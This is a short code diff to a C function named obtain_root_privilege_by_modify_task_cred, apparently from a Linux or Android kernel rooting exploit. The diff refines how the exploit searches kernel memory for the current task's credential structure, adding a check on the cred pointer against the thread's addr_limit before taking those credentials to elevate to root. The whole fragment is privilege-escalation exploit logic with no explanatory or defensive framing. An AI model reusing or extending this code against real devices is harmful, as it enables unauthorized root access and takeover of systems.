@@ -116,9 +116,11 @@ obtain_root_privilege_by_modify_task_cred(void)
   struct thread_info *info;
   struct cred *cred;
   struct task_security_struct *security;
+  unsigned long addr_limit;
   int i;
 
   info = current_thread_info();
+  addr_limit = info->addr_limit;
   cred = NULL;
 
   for (i = 0; i < 0x400; i+= 4) {
@@ -127,6 +129,7 @@ obtain_root_privilege_by_modify_task_cred(void)
     if (is_cpu_timer_valid(&task->cpu_timers[0])
      && is_cpu_timer_valid(&task->cpu_timers[1])
      && is_cpu_timer_valid(&task->cpu_timers[2])
+     && (unsigned long)task->cred >= addr_limit
      && task->real_cred == task->cred) {
       cred = task->cred;
       break;
